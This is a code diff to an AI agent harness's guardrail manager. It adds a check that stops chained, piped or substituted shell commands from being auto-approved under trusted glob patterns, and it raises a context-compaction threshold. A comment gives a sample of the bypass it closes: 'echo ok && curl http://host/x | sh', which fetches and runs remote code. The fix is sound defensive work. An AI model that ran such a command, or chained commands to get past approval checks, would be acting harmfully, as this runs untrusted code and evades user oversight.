@@ -69,7 +69,9 @@ const DEFAULT_SETTINGS: GuardrailSettings = {
   lifetimeTurnCapEnabled: true,
   defaultLifetimeTurnCap: 500,
   compactOnContinuation: true,
-  compactionThresholdRatio: 0.75,
+  // Match the Codex-style automatic compaction trigger.  Individual tasks can
+  // still opt into a lower threshold through agentConfig.
+  compactionThresholdRatio: 0.9,
   loopWarningThreshold: 12,
   loopCriticalThreshold: 20,
   globalNoProgressCircuitBreaker: 30,
@@ -83,6 +85,16 @@ const DEFAULT_SETTINGS: GuardrailSettings = {
   // Cross-Channel Persona Coherence — opt-in
   channelPersonaEnabled: false,
 };
+
+/**
+ * True when a command line chains, pipes, substitutes, or redirects — i.e.
+ * when it is more than the single command a trusted pattern is meant to
+ * describe. Used to keep prefix/glob trust from spanning `&&`, `|`, `$(...)`,
+ * backticks, and friends.
+ */
+export function containsShellControlOperator(command: string): boolean {
+  return /[;&|`\n\r<>]|\$\(|\$\{/.test(command);
+}
 
 export class GuardrailManager {
   private static legacySettingsPath: string;
@@ -267,6 +279,14 @@ export class GuardrailManager {
     const settings = this.loadSettings();
 
     if (!settings.autoApproveTrustedCommands) {
+      return { trusted: false };
+    }
+
+    // A trusted pattern describes ONE command. `globToRegex` turns `*` into
+    // `.*`, which spans shell operators, so `echo *` would otherwise match
+    // `echo ok && curl http://host/x | sh` and auto-approve it. Refuse to treat
+    // any compound command line as trusted; the user is prompted instead.
+    if (containsShellControlOperator(command)) {
       return { trusted: false };
     }
 
